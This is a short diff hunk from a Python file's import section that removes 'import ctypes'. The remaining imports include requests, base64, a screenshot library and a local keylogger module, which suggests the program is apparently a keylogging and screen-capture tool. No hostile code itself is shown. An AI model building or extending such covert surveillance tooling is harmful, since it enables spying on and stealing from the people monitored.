@@ -7,7 +7,6 @@ import shutil
 import sys
 import base64
 import requests
-import ctypes
 from mss import mss
 import threading
 from keylogger import Keylogger as keylogger
